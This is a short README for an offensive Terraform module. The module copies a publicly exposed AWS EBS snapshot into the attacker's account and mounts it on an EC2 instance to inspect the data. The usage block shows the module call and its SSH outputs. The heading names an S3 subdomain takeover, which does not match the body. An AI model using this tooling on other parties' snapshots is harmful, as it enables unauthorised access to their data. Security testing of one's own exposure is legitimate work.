# AWS S3 Subdomain Takeover

![OffensiveTerraform](https://img.shields.io/badge/hack-success)
![OffensiveTerraform](https://img.shields.io/badge/offensive-terraform-blueviolet)
![OffensiveTerraform](https://img.shields.io/badge/aws-important)

Offensive Terraform module which copies publicly exposed EBS snapshot to us-east-1 region in attacker's AWS account and creates EBS volume from a copied EBS snapshot. After that, the module attaches and mounts an EBS volume to an EC2 instance.

![Attack Diagram](https://raw.githubusercontent.com/offensive-terraform/terraform-aws-publicly-exposed-ebs-snapshot-inspector/master/diagram.jpg)

## Usage
```
module "publicly-exposed-ebs-snapshot-inspector" {
    source  = "offensive-terraform/publicly-exposed-ebs-snapshot-inspector/aws"

    public_snapshot_id = "snap-000000000000"
}

output "ssh_private_key" {
  value = module.publicly-exposed-ebs-snapshot-inspector.ssh_private_key
}

output "ssh_ec2_connect" {
  value = module.publicly-exposed-ebs-snapshot-inspector.ssh_ec2_connect
}
```

## Author
Module managed by https://github.com/iganbold
